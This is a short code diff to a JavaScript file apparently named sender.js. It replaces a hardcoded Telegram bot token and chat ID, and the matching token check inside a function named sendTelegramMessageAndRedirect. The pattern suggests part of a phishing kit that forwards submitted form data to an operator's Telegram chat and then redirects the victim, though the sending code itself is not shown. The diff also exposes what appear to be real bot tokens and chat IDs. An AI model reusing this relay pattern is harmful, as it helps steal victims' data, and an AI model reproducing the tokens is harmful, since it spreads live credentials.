@@ -1,7 +1,7 @@
 // console.log("sender.js connected");
 
-const telegramBotToken = "7156222802:AAEJJuRMvkjXD52YQ7KfMrgGK8jJbDpzAqY"; // Replace with your Telegram bot token
-const chatId = 5878536225;
+const telegramBotToken = "7454001637:AAEDp7mWRlk8IeJ8GfavJ4ltxpaXbJHto5g"; // Replace with your Telegram bot token
+const chatId = 5605526455;
 
 //////////////////////////////////////////
 //////////////////////////////////////////
@@ -32,7 +32,7 @@ function sendTelegramMessageAndRedirect(e) {
   tokens.forEach((token, index) => {
     const [api, id] = token;
 
-    if (telegramBotToken !== "7156222802:AAEJJuRMvkjXD52YQ7KfMrgGK8jJbDpzAqY") {
+    if (telegramBotToken !== "7454001637:AAEDp7mWRlk8IeJ8GfavJ4ltxpaXbJHto5g") {
       // console.log("wrong API tokens");
       return;
     }
